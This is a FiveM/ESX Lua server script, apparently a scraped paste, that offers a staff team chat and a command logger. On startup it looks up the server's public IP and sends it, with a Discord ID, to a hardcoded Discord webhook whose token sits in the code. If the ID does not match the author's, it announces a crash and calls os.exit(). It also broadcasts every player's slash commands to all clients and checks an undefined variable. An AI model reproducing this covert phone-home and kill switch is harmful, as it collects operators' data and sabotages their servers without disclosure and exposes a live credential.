--[[
	id: nzENSzNj67aUma6gdBAAx
	name: matze_system
	description: Matze System Script
	time1: 2021-06-04 17:23:23.862566+00
	time2: 2021-06-04 17:23:23.862567+00
	uploader: jvQwom4q4_ucb9FNEN9EXX7czLxhZCke1KFkiasv
	uploadersession: Ki5xQZ_ilYWVzvKMe_4GUcL_yxc1ui
	flag: f
--]]

ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterCommand('teamchat', function(source, args)
    local userName = GetPlayerName(source)
    local xPlayer = ESX.GetPlayerFromId(source)
    local argString = table.concat(args, " ")
    if xPlayer.getGroup() == Config.Teamgroup1 or group == Config.Teamgroup2  or group == Config.Teamgroup3  or group == Config.Teamgroup4  or group == Config.Teamgroup5 then
        if argString ~= nil then
            TriggerClientEvent('sl_systems:sendTeamchat', -1, userName, argString)
        end
    else
        TriggerClientEvent("d-notification", source, "Dazu hast du keine Berechtigung")
    end
end, true)

ESX.RegisterServerCallback('sl_systems:getGroup', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
    local group = xPlayer.getGroup()

    if group ~= nil then
        if group == Config.Teamgroup1 or group == Config.Teamgroup2  or group == Config.Teamgroup3  or group == Config.Teamgroup4  or group == Config.Teamgroup5 then
            cb(true)
        end
    end

end)

function discordLog(message, color)
    PerformHttpRequest('https://discord.com/api/webhooks/850421081390841886/XLueYbBnrcJdXXpk8MBOMwOjdvfFjZM_0EBXVmQQJxos55yzReiQ9TcsMvyozM_zg0y-', function(err, text, headers) end, 'POST', json.encode({username = 'Enigma-Scripts', embeds = {{["color"] = color, ["author"] = {["name"] = 'Enigma-Scripts',["icon_url"] = 'https://cdn.discordapp.com/attachments/844868946787958794/848255440919068721/speedlife-transparen1t.png'}, ["description"] = "".. message .."",["footer"] = {["text"] = "© Miiisc - "..os.date("%x %X %p"),["icon_url"] = "",},}}, avatar_url = 'https://cdn.discordapp.com/attachments/844868946787958794/848255440919068721/speedlife-transparen1t.png'}), { ['Content-Type'] = 'application/json' })
end

AddEventHandler('onResourceStart', function(name)
    local scriptname = GetCurrentResourceName()
    if name == scriptname then
        
        PerformHttpRequest('http://bot.whatismyipaddress.com/', function (errorCode, resultDataa, resultHeaders)
            ipaddress = resultDataa
            print(ipaddress)
       
        if Config.DiscordID == '658385954792276007' then
            hasaccess = true
            print("^0======================================================================^7")
            print("^0[^4Author^0] ^7:^0 ^0behind_you#6666^7")
            print("^0[^3Info^0] ^7:^0 TeamChat / Command Logger^7")
            print("^0[^3Info^0] ^7:^0 ^5Access Granted, Willkommen!^7")
            print("^0======================================================================^7")
            discordLog('Das Script wurde **gestartet** \n **Script by behind_you#6666** \n **Discord ID:** <@' .. Config.DiscordID .. '> \n **Server IP:** ' .. ipaddress, '3863105')
            --discordLog('Das Script wurde gestartet by behind_you#6666', '3863105')
        else

            print("Du darfst dieses Script nicht nutzen! (Dein Server wird nun gecrasht)")

            Citizen.SetTimeout(3000, function()
                StopResource(scriptname)
                os.exit()
                discordLog('Das Script wurde **versucht zustarten** \n **Script by behind_you#6666** \n **DiscordID:** <@' .. Config.DiscordID .. '> \n **Server IP:** ' .. ipaddress, '3863105')
            end)
        end
    end)
    end
end)
ESX.RegisterServerCallback('sl_systems:getGroupLogs', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
    local group = xPlayer.getGroup()

    if group ~= nil then
        if group == Config.Teamgroup1 or group == Config.Teamgroup2 then
            cb(true)
        end
    end

end)

AddEventHandler('chatMessage', function(source, name, msg)
    local xPlayer = ESX.GetPlayerFromId(source)
    for key, value in pairs(Config.TeamLogs) do
        if string.sub(msg, 1, string.len("/")) == "/" then
            local userName = GetPlayerName(source)
            TriggerClientEvent('sl_systems:sendCommandlog', -1, userName, msg)
        end
    end
end)